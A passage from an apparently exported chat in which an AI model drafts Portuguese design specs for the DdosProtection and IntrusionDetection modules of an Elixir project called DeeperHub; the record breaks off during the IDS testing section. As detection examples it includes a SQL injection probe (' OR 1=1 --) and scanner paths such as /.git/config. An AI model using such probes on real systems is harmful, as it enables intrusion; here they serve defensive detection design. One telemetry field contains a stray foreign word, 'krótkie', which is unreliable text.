*   **Análise de Padrões de Ataque (via `PatternAnalyzer`):**
    *   Implementar (ou integrar com ferramentas que implementam) detecção para tipos comuns de ataques DDoS no nível da aplicação (ex: HTTP GET/POST floods, ataques a formulários de login/registro).
    *   Analisar User-Agents, referers, e outros cabeçalhos para identificar tráfego de bots.
*   **Modo de Proteção Avançada/Sob Ataque (`set_advanced_protection/2`):**
    *   Permitir a ativação manual ou automática de um modo de \"sob ataque\" que aplica regras mais estritas:
        *   Limites de taxa muito mais baixos para todos os IPs ou para IPs não autenticados.
        *   Desafios de JavaScript ou CAPTCHA para novos visitantes ou tráfego suspeito.
        *   Bloqueio de faixas de IPs suspeitas, de ASNs conhecidos por originar ataques, ou de geografias específicas.
        *   Possível \"lista cinza\" de IPs que passam por verificações mais rigorosas.
*   **Relatórios e Estatísticas (`get_statistics/1`):**
    *   Fornecer estatísticas sobre o volume de tráfego total, tráfego por IP/path, requisições bloqueadas/limitadas por taxa, e IPs atualmente bloqueados por políticas de DDoS.
*   **Integração com Serviços Externos de Mitigação DDoS (Opcional):**
    *   API para reportar IPs atacantes a serviços como Cloudflare, Akamai, AWS Shield.
    *   API para receber e aplicar listas de bloqueio de IPs desses serviços.
*   **Configurabilidade das Políticas:**
    *   Políticas de limitação de taxa, limiares para detecção de ataque, duração e escalonamento de bloqueios devem ser configuráveis via `DeeperHub.Security.Policy.SecurityPolicyManager`.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DdosProtection` (Fachada Pública):**
    *   Ponto de entrada para funcionalidades de proteção DDoS.
    *   Delega para `DdosProtectionService`.
2.  **`DeeperHub.Security.DdosProtection.Services.DdosProtectionService` (GenServer):**
    *   **Responsabilidade:** Processo central que monitora o tráfego, gerencia o estado de \"sob ataque\", aplica políticas dinâmicas de rate limiting e coordena o bloqueio de IPs.
    *   **Estado Interno (pode usar ETS para contadores de alta performance):**
        *   Contadores de requisições agregados (global, por path, por IP em períodos curtos).
        *   Estado atual do modo de proteção (normal, avançado/sob ataque).
        *   Limiares dinâmicos que podem ser ajustados.
    *   **Interações:**
        *   `DeeperHub.API.RateLimiterFacade` (ou um rate limiter interno específico para DDoS): Para a mecânica de contagem e limitação.
        *   `DeeperHub.Security.IPFirewallService`: Para efetuar o bloqueio/desbloqueio de IPs.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter políticas e limiares.
        *   `DeeperHub.Security.Monitoring`: Para registrar alertas de DDoS.
        *   `DeeperHub.Security.DdosProtection.PatternAnalyzer`: Para análises mais profundas.
3.  **`DeeperHub.Security.Plugs.DdosProtectionPlug` (Phoenix Plug):**
    *   **Responsabilidade:** Interceptar requisições HTTP muito cedo no pipeline.
    *   Registra a requisição (`DdosProtectionService.record_request/3`).
    *   Verifica se a requisição deve ser bloqueada ou limitada por taxa com base nas políticas de DDoS (`DdosProtectionService.check_request/3`).
    *   Deve ser posicionado após o `IPFirewallPlug` (para IPs já conhecidos como maus) mas antes de plugs mais custosos.
4.  **`DeeperHub.Security.DdosProtection.PatternAnalyzer` (Worker GenServer ou Módulo Funcional):**
    *   **Responsabilidade:** Analisar logs de tráfego ou um stream de eventos de requisição em background para identificar padrões de ataque mais sutis que a simples contagem de requisições por IP (ex: distribuição anômala de User-Agents, targeting de endpoints específicos por múltiplos IPs de forma coordenada).
    *   Pode usar regras ou modelos simples de ML.
5.  **Adaptadores para Serviços Externos de Mitigação (Opcional):**
    *   Módulos específicos para interagir com APIs de Cloudflare, AWS WAF/Shield, etc.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/ddos_protection/
├── ddos_protection.ex                # Fachada Pública
│
├── services/
│   └── ddos_protection_service.ex    # GenServer principal com a lógica de DDoS
│
├── plug/                             # (Pode estar em deeper_hub_web/plugs)
│   └── ddos_protection_plug.ex
│
├── pattern_analyzer.ex               # Worker/Serviço para análise de padrões
│
├── external_mitigation/              # (Opcional) Adaptadores para serviços de terceiros
│   ├── cloudflare_adapter.ex
│   └── aws_shield_adapter.ex
│
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Performance é Chave:** O `DdosProtectionPlug` e as verificações iniciais no `DdosProtectionService` devem ser extremamente rápidos. Contadores em ETS são essenciais.
*   **Defesa em Camadas:** A proteção DDoS na aplicação é uma camada. Idealmente, há proteção na borda da rede (firewalls, provedor de hospedagem, CDN).
*   **Falsos Positivos:** Bloquear tráfego legítimo é um grande risco. O \"modo de proteção avançada\" deve ser ativado com cautela, e mecanismos para liberar IPs legítimos bloqueados erroneamente devem existir.
*   **Adaptabilidade:** Limiares e regras devem ser ajustáveis, possivelmente dinamicamente com base na carga observada ou em alertas.

## 🛠️ 4. Casos de Uso Principais

*   **HTTP GET Flood em `/search`:**
    *   Muitos IPs (ou um só) enviam um grande volume de GETs para `/search`.
    *   `DdosProtectionPlug` registra cada requisição.
    *   `DdosProtectionService` detecta que o limite de taxa para o path `/search` (ou para os IPs individuais) foi excedido.
    *   Os IPs atacantes são enviados para `IPFirewallService.block_ip/3`.
    *   O sistema pode entrar em \"modo avançado\", aplicando um desafio CAPTCHA para todas as requisições a `/search` de IPs não autenticados ou novos.
*   **Ataque de Login Distribuído (Credential Stuffing):**
    *   Muitos IPs diferentes tentam fazer login com credenciais variadas.
    *   `DdosProtectionService` pode não detectar por IP individual, mas o `PatternAnalyzer` (analisando logs de `BruteForceProtection` e tráfego de API) pode identificar um aumento anormal nas tentativas de login em geral.
    *   Isso pode disparar um alerta para `Security.Monitoring` ou ativar o modo de proteção avançada, que poderia impor um CAPTCHA global para login ou limites de taxa mais baixos por IP.
*   **Administrador Ativa Modo \"Sob Ataque\":**
    *   Monitoramento externo indica um ataque DDoS volumétrico.
    *   Administrador usa `DeeperHub.Console` para chamar `DdosProtection.set_advanced_protection(true, opts)`.
    *   Todas as novas requisições de IPs não reconhecidos passam por um desafio JavaScript ou são servidas com conteúdo estático de \"estamos sob ataque\", enquanto IPs conhecidos/autenticados podem ter acesso limitado.

## 🌊 5. Fluxos Importantes

### Fluxo de Mitigação de HTTP Flood por IP Único

1.  **Requisições Maliciosas:** Um IP (`1.2.3.4`) começa a enviar centenas de requisições por segundo para `/api/v1/data`.
2.  **`DdosProtectionPlug`:**
    *   Para cada requisição, chama `DdosProtectionService.record_and_check_request(\"1.2.3.4\", \"/api/v1/data\", context)`.
3.  **`DdosProtectionService`:**
    *   Incrementa o contador de requisições para `ip:1.2.3.4` e para `path:/api/v1/data`.
    *   Verifica se o contador para `ip:1.2.3.4` excedeu o limiar (ex: 100 reqs/minuto).
    *   **Limite Excedido:**
        *   Loga o evento.
        *   Incrementa métrica `ddos.ip_rate_limited`.
        *   Chama `DeeperHub.Security.IPFirewallService.block_ip(\"1.2.3.4\", \"DDoS rate limit exceeded on /api/v1/data\", 3600)`.
        *   Retorna `{:block, :ip_rate_limit_exceeded}` para o Plug.
4.  **`DdosProtectionPlug`:** Ao receber `{:block, ...}`, instrui a `conn` a retornar um `429 Too Many Requests` ou `403 Forbidden`.
5.  **Requisições Subsequentes de `1.2.3.4`:** Serão bloqueadas mais cedo pelo `IPFirewallPlug`.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.DdosProtection.check_request_permitted?(ip_address :: String.t(), path :: String.t(), context :: map()) :: boolean()` (Nova Sugestão)

*   **Descrição:** Verifica se uma requisição deve ser permitida com base nas políticas de DDoS atuais. Retorna `true` se permitida, `false` se deve ser bloqueada ou limitada por taxa. Usado pelo Plug.
*   **`context`:** `%{method: \"GET\", headers: %{...}}`.

### 6.2. `DeeperHub.Security.DdosProtection.record_request_data(ip_address :: String.t(), path :: String.t(), context :: map(), response_status_code :: integer()) :: :ok` (Nova Sugestão)

*   **Descrição:** Registra dados sobre uma requisição processada para análise de padrões e para a mecânica de rate limiting. Chamado pelo Plug *após* a requisição ser processada pelo controller (para ter o status code).

### 6.3. `DeeperHub.Security.DdosProtection.report_suspicious_ip(ip_address :: String.t(), reason :: String.t(), evidence :: map() | nil) :: :ok`

*   **Descrição:** Permite que outros módulos (ex: `FraudDetection`, `IntrusionDetection`) reportem um IP como suspeito de atividade DDoS, podendo levar ao seu bloqueio.

### 6.4. `DeeperHub.Security.DdosProtection.set_protection_level(level :: :normal | :high_alert | :under_attack, opts :: keyword()) :: :ok` (Renomeado de `set_advanced_protection`)

*   **Descrição:** Define o nível de proteção global do sistema.
*   **`opts`:** Configurações específicas para o nível (ex: para `:under_attack`, `%{challenge_type: :js_challenge, global_ip_rate_limit: 5}`).

### 6.5. `DeeperHub.Security.DdosProtection.get_current_protection_level() :: {:ok, %{level: atom(), active_policies: map()}}` (Nova Sugestão)

*   **Descrição:** Retorna o nível de proteção atual e as políticas ativas.

### 6.6. `DeeperHub.Security.DdosProtection.get_traffic_statistics(opts :: keyword()) :: {:ok, map()}` (Renomeado de `get_statistics`)

*   **Descrição:** Obtém estatísticas de tráfego e mitigação.
*   **`opts`:** `:period` (`:last_minute`, `:last_hour`, `:last_day`), `:group_by` (`:ip`, `:path`).

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :ddos, :enabled]`** (Boolean): Habilita o módulo.
*   **`[:security, :ddos, :default_policies, :normal_level]`** (Map): Configs de rate limit para IPs, paths, etc., em modo normal.
    *   Ex: `%{global_ip_limit: %{requests: 1000, window_seconds: 60}, path_limits: %{\"/api/search\" => %{requests: 60, window_seconds: 60}}}`
*   **`[:security, :ddos, :default_policies, :high_alert_level]`** (Map): Configs mais restritivas.
*   **`[:security, :ddos, :default_policies, :under_attack_level]`** (Map): Configs muito restritivas, possivelmente com `challenge_type: :js_challenge | :captcha`.
*   **`[:security, :ddos, :ip_block_on_ddos, :duration_seconds]`** (Integer): Duração padrão de bloqueio para IPs envolvidos em DDoS.
*   **`[:security, :ddos, :pattern_analyzer, :enabled]`** (Boolean).
*   **`[:security, :ddos, :pattern_analyzer, :log_analysis_interval_minutes]`** (Integer).
*   **`[:security, :ddos, :notification_thresholds, :global_rps]`** (Integer): Limiar de RPS global para notificar admins.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.EventBus`.
*   `DeeperHub.Security.IPFirewallService`: Para efetuar bloqueios de IP.
*   `DeeperHub.API.RateLimiterFacade`: Como um dos mecanismos para implementar os limites de taxa.
*   `DeeperHub.Security.Monitoring`: Para enviar alertas de DDoS.
*   `DeeperHub.Security.CaptchaService` (ou um serviço de desafio genérico): Se desafios forem usados.

### 8.2. Bibliotecas Externas

*   Nenhuma específica para a lógica central. Adaptadores para serviços de mitigação externos teriam suas próprias dependências (ex: clientes HTTP).

## 🤝 9. Como Usar / Integração

*   **`DdosProtectionPlug`:** Adicionar ao pipeline global do Phoenix Router, bem no início.
    ```elixir
    pipeline :protect_all_the_things do
      plug DeeperHub.Security.Plugs.DdosProtectionPlug
      # ... outros plugs ...
    end
    scope \"/\", DeeperHubWeb do
      pipe_through [:browser, :protect_all_the_things] # ou apenas :protect_all_the_things
      # ...
    end
    ```
*   **Alertas de Monitoramento Externo:** Um sistema de monitoramento externo pode chamar uma API administrativa (protegida) que por sua vez chama `DdosProtection.set_protection_level(:under_attack, ...)` se um ataque massivo for detectado na borda da rede.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Simular diferentes cenários de flood HTTP (single IP, multi IP, path específico) e verificar se o `DdosProtectionPlug` e o `DdosProtectionService` aplicam rate limiting e bloqueios corretamente.
*   Testar a transição entre diferentes níveis de proteção e se as políticas correspondentes são aplicadas.
*   Testar a lógica do `PatternAnalyzer` com logs de tráfego simulados.
*   Localização: `test/deeper_hub/security/ddos_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.ddos.requests.total` (Contador, tags: `path`, `ip_country` (se disponível))
*   `deeper_hub.security.ddos.requests.rate_limited.count` (Contador, tags: `path`, `ip_address_masked`)
*   `deeper_hub.security.ddos.requests.blocked_by_ddos.count` (Contador, tags: `path`, `ip_address_masked`)
*   `deeper_hub.security.ddos.protection_level.gauge` (Gauge, valor: 0=normal, 1=high_alert, 2=under_attack)
*   `deeper_hub.security.ddos.active_ip_blocks_ddos.gauge` (Gauge)

### 10.3. Logs

*   **Nível INFO:** Mudança no nível de proteção.
*   **Nível WARNING:** IP sendo limitado por taxa devido a política de DDoS. IP bloqueado por política de DDoS. Padrão de ataque suspeito detectado pelo `PatternAnalyzer`.
*   **Nível ERROR:** Falha ao aplicar uma política de bloqueio.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ddos, :request_analysis]`
    *   Metadados: `%{ip: ip, path: path, user_agent_ krótkie, result: :allowed | :rate_limited | :blocked, current_rps: rps}`
*   `[:deeper_hub, :security, :ddos, :ip_action_ddos]`
    *   Metadados: `%{ip: ip, action: :blocked | :unblocked_ddos, reason: reason, duration: dur}`
*   `[:deeper_hub, :security, :ddos, :protection_level_change]`
    *   Metadados: `%{old_level: level, new_level: level, trigger: :manual | :automatic}`

## ❌ 11. Tratamento de Erros

*   Falhas nos componentes de proteção DDoS (ex: ETS cheio, erro no `PatternAnalyzer`) não devem derrubar a aplicação. O sistema deve tentar operar em um modo seguro ou degradado.
*   Erros ao bloquear um IP via `IPFirewallService` devem ser logados, mas o rate limiting ainda deve funcionar se possível.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Falsos Positivos:** A principal preocupação. Limites muito baixos ou detecção de padrões muito sensível podem bloquear tráfego legítimo. A capacidade de ajustar políticas e ter um modo \"monitor\" é importante.
*   **Bypass:** Atacantes podem tentar contornar a proteção baseada em IP usando proxies ou botnets grandes. A análise de padrões e a integração com `DeviceFingerprint` ou `BehavioralAnalysis` podem ajudar.
*   **Recursos do Próprio Módulo:** O monitoramento de tráfego e a manutenção de contadores podem consumir recursos. Otimizar o uso de ETS e amostrar dados para o `PatternAnalyzer` é importante.

## 🧑‍💻 13. Contribuição

*   Novas regras de detecção de padrões devem ser adicionadas ao `PatternAnalyzer` com testes rigorosos.
*   Ao integrar com serviços externos de mitigação, crie adaptadores claros e resilientes.
*   Políticas de rate limiting devem ser revisadas e ajustadas com base no tráfego observado e no perfil de risco da aplicação.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar desafios JavaScript mais leves antes de recorrer a CAPTCHAs completos para tráfego suspeito, mas não claramente malicioso.
*   [ ] Desenvolver um sistema de \"aprendizado\" para os limiares de rate limiting, permitindo que se ajustem dinamicamente à carga normal da aplicação.
*   [ ] Integração mais profunda com WAFs na borda para bloquear tráfego no nível da infraestrutura com base nas detecções da aplicação.
*   [ ] Análise de \"fingerprints de bot\" para identificar e bloquear tráfego automatizado malicioso de forma mais eficaz.
*   [ ] Permitir que usuários (especialmente clientes de API) solicitem aumento de limites de taxa mediante justificativa ou plano de assinatura.

---

*Última atualização: 2025-05-12*

---

Proteção DDoS é uma batalha contínua!

Agora que cobrimos várias camadas de segurança (`AdminAuth`, `CsrfProtection`, `SqlInjectionProtection`, `PathTraversalProtection`, `DdosProtection`), e também módulos Core (`EventBus`, `ConfigManager`, `Logger`, `Metrics`, `Cache`, `Repo`), talvez seja uma boa hora para um módulo de domínio, como `DeeperHub.Servers` ou `DeeperHub.Accounts` (que já começamos)? Ou prefere continuar com os módulos de segurança restantes, como `AtRestEncryptionService` ou `ResponseSanitizer`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar com os módulos de segurança, pois são a espinha dorsal da proteção do sistema.

Dado que já abordamos `AtRestEncryptionService` de forma implícita ao falar do `Core.EncryptionService` e `EncryptedType`, e `ResponseSanitizer` é conceitualmente similar ao `LogSanitizer` (focado em respostas HTTP), que tal detalharmos o `DeeperHub.Security.IntrusionDetection`? Este módulo atua como um sistema de alerta para atividades suspeitas que podem não ser fraude direta, mas indicam uma possível tentativa de comprometer o sistema.

---

# Módulo: `DeeperHub.Security.IntrusionDetection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.IntrusionDetection`

O módulo `DeeperHub.Security.IntrusionDetection` (IDS) funciona como um sistema de vigilância para o DeeperHub, monitorando atividades e eventos em busca de padrões que possam indicar uma tentativa de intrusão ou exploração de vulnerabilidades. Diferente da detecção de fraude (que foca em abuso de funcionalidades legítimas para ganho ilícito) ou da proteção contra força bruta (que foca em adivinhação de credenciais), o IDS procura por sinais de reconhecimento, exploração de falhas de segurança conhecidas, ou comportamento anômalo que sugira um ator malicioso tentando obter acesso não autorizado ou escalar privilégios.

Ele analisa logs, eventos de rede (se aplicável no nível da aplicação), e atividades de usuário, comparando-os com um conjunto de regras, assinaturas de ataques conhecidos e, potencialmente, com desvios de comportamento normal estabelecido. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Atividades (`record_activity/2`):**
    *   Receber e registrar eventos de diversas fontes do sistema (logs de aplicação, eventos de autenticação, acesso a arquivos, chamadas de API, etc.) para análise.
*   **Detecção Baseada em Assinaturas/Regras (`analyze_activity/2`):**
    *   Comparar atividades com um conjunto de regras e assinaturas de ataques conhecidos (ex: tentativas de SQL Injection, XSS, Path Traversal, varredura de diretórios, uso de comandos suspeitos em entradas).
    *   Identificar o uso de ferramentas de hacking comuns através de padrões em User-Agents ou parâmetros.
*   **Detecção Baseada em Anomalias (Integração):**
    *   Integrar-se com `DeeperHub.Security.BehavioralAnalysis` para identificar desvios significativos do comportamento normal de um usuário que possam indicar comprometimento de conta.
    *   Monitorar sequências de ações incomuns.
*   **Análise de Logs:**
    *   Processar logs da aplicação e do sistema (se acessíveis) para encontrar padrões suspeitos ou mensagens de erro indicativas de uma tentativa de exploração.
*   **Gerenciamento de Alertas de Intrusão (`get_alerts/1`, `generate_alert` via `Security.Monitoring`):**
    *   Gerar alertas quando uma atividade suspeita ou uma intrusão potencial é detectada.
    *   Classificar alertas por severidade (baixo, médio, alto, crítico).
*   **Resposta a Incidentes (Limitada/Coordenada):**
    *   Tomar ações de resposta configuráveis (ex: bloquear IP via `IPFirewallService`, invalidar sessão do usuário via `Auth.SessionManager`, notificar administradores via `Security.Monitoring`).
    *   Fornecer informações detalhadas para auxiliar na investigação manual de incidentes.
*   **Configuração de Regras e Assinaturas (`configure_rules/1`):**
    *   Permitir a atualização e customização do conjunto de regras e assinaturas de detecção.
*   **Relatórios e Estatísticas (`get_statistics/1`):**
    *   Fornecer dados sobre intrusões detectadas, tipos de ataque, fontes, etc.
*   **Verificação de Reputação (IP/Usuário) (`check_ip/1`, `check_user/1`):**
    *   Manter um histórico de atividades suspeitas por IP ou usuário para auxiliar na avaliação de risco contínua.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.IntrusionDetection` (Fachada Pública):**
    *   Ponto de entrada para registrar atividades e consultar o status do IDS.
    *   Delega para o `IntrusionDetectionService`.
2.  **`DeeperHub.Security.IntrusionDetection.Services.IntrusionDetectionService` (GenServer):**
    *   **Responsabilidade:** Processo central que recebe eventos de atividade, aplica regras de detecção, gerencia o estado das ameaças percebidas e coordena respostas.
    *   **Estado Interno:**
        *   Conjunto de regras/assinaturas ativas.
        *   Contadores de atividades suspeitas por IP/usuário/tipo de ataque.
        *   Estado de alertas ativos.
    *   **Interações:**
        *   `RuleEngine`: Para aplicar regras de detecção.
        *   `AnomalyDetector` (pode ser parte de `BehavioralAnalysis`): Para detecção baseada em anomalias.
        *   `DeeperHub.Security.IPFirewallService`: Para bloquear IPs.
        *   `DeeperHub.Auth.SessionManager`: Para invalidar sessões.
        *   `DeeperHub.Security.Monitoring`: Para gerar alertas.
        *   `DeeperHub.Audit`: Para registrar intrusões e ações.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter regras e configurações.
3.  **`DeeperHub.Security.IntrusionDetection.RuleEngine` (Módulo Funcional):**
    *   **Responsabilidade:** Aplicar o conjunto de regras e assinaturas aos eventos de atividade recebidos.
    *   Pode usar regex, correspondência de padrões, ou lógica mais complexa.
4.  **`DeeperHub.Security.IntrusionDetection.SignatureDatabase` (Módulo/ETS/Arquivo):**
    *   **Responsabilidade:** Armazenar as assinaturas de ataques conhecidos e regras de detecção. Pode ser atualizável.
5.  **Fontes de Eventos (Módulos da Aplicação):**
    *   Diversos módulos (`API`, `Auth`, `FileHandler`, etc.) enviam eventos de atividade para o `IntrusionDetectionService` através de `record_activity/2`.
6.  **`DeeperHub.Security.IntrusionDetection.Supervisor`:**
    *   Supervisiona o `IntrusionDetectionService` e quaisquer workers associados.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/intrusion_detection/
├── intrusion_detection.ex            # Fachada Pública
│
├── services/
│   └── intrusion_detection_service.ex # GenServer principal
│
├── rule_engine.ex                    # Lógica de aplicação de regras
├── signature_database.ex             # Módulo para acesso a assinaturas/regras
│
├── rules/                            # (Opcional) Onde definições de regras podem ser armazenadas
│   └── sql_injection_signatures.exs
│
├── supervisor.ex
└── telemetry.ex
```
*(O `IntrusionDetectionAdapter` e `IntrusionDetectionBehaviour` da documentação original são consolidados aqui.)*

### 3.3. Decisões de Design Importantes

*   **Performance:** A análise de atividades deve ser eficiente para não sobrecarregar o sistema, especialmente se for síncrona em alguns pontos. Muitas análises podem ser assíncronas.
*   **Taxa de Falsos Positivos/Negativos:** Balancear a sensibilidade para detectar ameaças reais sem gerar um volume excessivo de falsos alertas é crucial.
*   **Atualização de Regras/Assinaturas:** O sistema deve permitir a fácil atualização do conjunto de regras e assinaturas para se adaptar a novas ameaças.
*   **Resposta Automatizada vs. Manual:** Definir claramente quais tipos de detecção justificam uma resposta automatizada (ex: bloqueio de IP) versus aquelas que requerem análise manual.

## 🛠️ 4. Casos de Uso Principais

*   **Detecção de Tentativa de SQL Injection na API:**
    *   O `DeeperHub.API` (ou um plug de validação) envia um parâmetro de requisição suspeito para `IntrusionDetection.record_activity(%{type: :api_param, value: \" ' OR 1=1 --\", ...}, context)`.
    *   `IntrusionDetectionService` usa `RuleEngine` que identifica a assinatura de SQLi.
    *   Uma intrusão é registrada, um alerta é gerado para `Security.Monitoring`, e o IP pode ser enviado para `IPFirewallService` para bloqueio.
*   **Múltiplas Tentativas de Acesso a Arquivos Inexistentes (Varredura):**
    *   Um módulo que serve arquivos registra múltiplas tentativas falhas de acesso (404s) de um mesmo IP para caminhos que não existem, mas que parecem ser tentativas de encontrar vulnerabilidades (ex: `/.git/config`, `/admin.php`).
    *   Essas atividades são enviadas para `IntrusionDetection.record_activity/2`.
    *   `RuleEngine` ou `PatternAnalyzer` (dentro do `IntrusionDetectionService`) detecta o padrão de varredura.
    *   O IP é bloqueado e um alerta é gerado.
*   **Comportamento Anômalo de Usuário Após Login:**
    *   `BehavioralAnalysis` detecta um desvio significativo no comportamento de um usuário recém-logado.
    *   `BehavioralAnalysis` envia um evento de \"alta anomalia comportamental\" para o `IntrusionDetectionService`.
    *   `IntrusionDetectionService` pode correlacionar isso com outros fatores (ex: login de IP novo) e escalar para um alerta de possível comprometimento de conta, sugerindo a invalidação da sessão.

## 🌊 5. Fluxos Importantes

### Fluxo de Análise de Atividade Suspeita

1.  **Registro de Atividade:** Um módulo da aplicação (ex: um plug de firewall de aplicação web no nível da API) observa uma atividade (ex: uma requisição HTTP com parâmetros suspeitos) e chama `DeeperHub.Security.IntrusionDetection.record_activity(activity_details, context)`.
2.  **`IntrusionDetectionService` (GenServer):**
    *   Recebe a atividade.
    *   (Opcional) Persiste a atividade bruta para análise forense ou em lote.
    *   Envia a atividade para o `RuleEngine`.
3.  **`RuleEngine`:**
    *   Compara a atividade com o conjunto de regras e assinaturas carregadas da `SignatureDatabase`.
    *   **Regra Acionada:** Se uma ou mais regras/assinaturas corresponderem (ex: padrão de SQLi encontrado):
        *   Retorna os detalhes da(s) regra(s) acionada(s) e uma severidade associada para o `IntrusionDetectionService`.
    *   **Nenhuma Regra Acionada:** Retorna que nenhuma ameaça baseada em assinatura foi encontrada.
4.  **`IntrusionDetectionService` (Continuação):**
    *   **Se Ameaça Detectada:**
        *   Registra a intrusão (`record_intrusion/2`).
        *   Gera um alerta para `DeeperHub.Security.Monitoring` com a severidade e detalhes.
        *   Com base na severidade e na política configurada, toma ações de resposta:
            *   Chama `DeeperHub.Security.IPFirewallService.block_ip(...)`.
            *   Chama `DeeperHub.Auth.SessionManager.invalidate_session_for_user(...)`.
    *   (Opcional) Se nenhuma ameaça baseada em assinatura, mas a atividade for de um tipo que `BehavioralAnalysis` monitora, pode encaminhar para lá.
5.  **Resposta (Assíncrona):** A função `record_activity` geralmente retorna `:ok` rapidamente para não bloquear o chamador. As análises e respostas são tratadas em background.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.IntrusionDetection.record_activity(activity_data :: map(), context :: map() | nil) :: :ok`

*   **Descrição:** Registra uma atividade do sistema para análise pelo IDS. Esta é a principal forma de alimentar o IDS com dados.
*   **`activity_data`:** Mapa descrevendo a atividade. Deve incluir:
    *   `:type` (atom): Tipo de atividade (ex: `:http_request`, `:api_call`, `:file_access_attempt`, `:auth_attempt`).
    *   `:source_ip` (String.t | nil).
    *   `:user_id` (String.t | nil).
    *   `:timestamp` (DateTime.t).
    *   Outros campos específicos do tipo (ex: para `:http_request`, `%{path: \"/\", params: %{...}, headers: %{...}}`).
*   **`context`:** Metadados adicionais.

### 6.2. `DeeperHub.Security.IntrusionDetection.analyze_activity(activity_data :: map(), context :: map() | nil) :: {:ok, :normal | :suspicious | :intrusion_detected, details :: map() | nil}`

*   **Descrição:** Realiza uma análise síncrona de uma atividade específica. Usado quando uma decisão imediata é necessária.
*   **Retorno:** O nível de ameaça percebido e detalhes (ex: regras acionadas).

### 6.3. `DeeperHub.Security.IntrusionDetection.check_ip_reputation(ip_address :: String.t()) :: {:ok, %{risk_score: float(), known_threats: list(atom())}}` (Nova Sugestão)

*   **Descrição:** Consulta a base de dados interna do IDS (e potencialmente feeds externos) sobre a reputação de um IP.
*   **Retorno:** Score de risco e ameaças conhecidas associadas ao IP.

### 6.4. `DeeperHub.Security.IntrusionDetection.get_alerts(opts :: keyword()) :: {:ok, list(Alert.t())}`

*   **Descrição:** Lista os alertas de intrusão ativos ou recentes.
*   **`opts`:** `:severity_threshold` (atom), `:since` (DateTime.t), `:limit`.
*   **`Alert.t()`:** `%{id: String.t(), timestamp: DateTime.t(), type: atom(), severity: atom(), source_ip: String.t(), user_id: String.t(), description: String.t(), details: map(), status: :new | :acknowledged | :resolved}`.

### 6.5. `DeeperHub.Security.IntrusionDetection.configure_rules(rules_list :: list(map())) :: :ok | {:error, term()}`

*   **Descrição:** Atualiza ou substitui o conjunto de regras de detecção. Requer permissão de administrador.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :intrusion_detection, :enabled]`** (Boolean): Habilita/desabilita o IDS. (Padrão: `true`)
*   **`[:security, :intrusion_detection, :rules_source]`** (String | Module): Fonte das regras/assinaturas (ex: path de arquivo, módulo Elixir, tabela de DB).
*   **`[:security, :intrusion_detection, :default_action_on_detection, <severity>]`** (Map): Ação padrão para cada nível de severidade de intrusão.
    *   Ex: `%{critical: [:block_ip_permanent, :invalidate_session, :alert_admin_urgent], high: [:block_ip_temporary, :alert_admin]}`
*   **`[:security, :intrusion_detection, :ip_block_duration_on_intrusion_seconds]`** (Integer): Duração padrão para bloqueios de IP por intrusão.
*   **`[:security, :intrusion_detection, :event_log_retention_days]`** (Integer): Retenção para logs de atividade bruta.
*   **`[:security, :intrusion_detection, :alert_aggregation_window_seconds]`** (Integer): Janela para agregar múltiplos alertas similares em um único.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.EventBus`.
*   `DeeperHub.Security.IPFirewallService`: Para bloquear IPs.
*   `DeeperHub.Auth.SessionManager`: Para invalidar sessões.
*   `DeeperHub.Security.Monitoring`: Para gerar e encaminhar alertas.
*   `DeeperHub.Audit`: Para registrar intrusões confirmadas.
*   `DeeperHub.Security.BehavioralAnalysis`: Como uma fonte de eventos de anomalia.
*   `DeeperHub.Security.SqlInjectionProtection`, `XssProtection`, `PathTraversalProtection`: Podem alimentar o IDS com suas detecções.

### 8.2. Bibliotecas Externas

*   Bibliotecas de parsing de logs (se aplicável).
*   Bibliotecas para análise de padrões ou regex avançado.

## 🤝 9. Como Usar / Integração

*   **Plugs de Segurança:** Plugs no pipeline Phoenix podem chamar `IntrusionDetection.record_activity/2` com detalhes da requisição.
    ```elixir
    # Exemplo de Plug
    def call(conn, _opts) do
      activity = %{
        type: :http_request,
        source_ip: inspect(conn.remote_ip),
        path: conn.request_path,
        method: conn.method,
        headers: conn.req_headers,
        params: conn.params # Cuidado com dados sensíveis aqui! Sanitize antes.
      }
      user_id = conn.assigns.current_user_id # Se já autenticado
      context = %{user_id: user_id, session_id: Plug.Conn.get_session(conn, :session_id)}
      DeeperHub.Security.IntrusionDetection.record_activity(activity, context)
      conn
    end
    ```
*   **Módulos de Serviço:** Qualquer serviço que lide com operações sensíveis ou entradas do usuário deve registrar atividades relevantes.
    *   Ex: `DeeperHub.Accounts` pode registrar `:auth_attempt_failed`.
    *   Serviços de upload de arquivos podem registrar `:file_access_attempt`.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o `RuleEngine` com várias atividades e verificar se as regras corretas são acionadas.
*   Simular sequências de atividades que deveriam disparar uma detecção de padrão.
